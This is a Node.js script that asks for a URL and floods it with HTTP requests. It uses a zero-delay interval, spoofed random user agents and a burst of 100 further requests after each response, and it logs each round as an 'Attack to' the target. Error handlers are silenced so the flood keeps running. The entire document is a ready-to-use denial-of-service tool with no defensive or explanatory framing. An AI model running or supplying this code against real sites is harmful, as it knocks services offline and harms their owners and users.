const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;
process.on('uncaughtException', function (err) {});
process.on('unhandledRejection', function (err) {});
const got = require("got")
const fakeUa = require("fake-useragent");
const prompt = require("async-prompt")
async function main(){
const url = await prompt("URL : ");
setInterval(()=>{
got.get(url,{http2:true,
headers:{
'User-Agent': fakeUa(),
'Upgrade-Insecure-Requests': '1',
'Connection':'Keep-Alive',
'Keep-Alive': 'timeout=10,max=100',
'Origin': url,
'Referrer': url
}
}).then((res)=>{
console.log("Attack to ",url,res.statusCode)
if(res.statusCode){
for (let i=0;i<100;i++){
got.get(url)}
}
}).catch((err)=>{
console.log(err.statusMessage)
})
})
}
main()
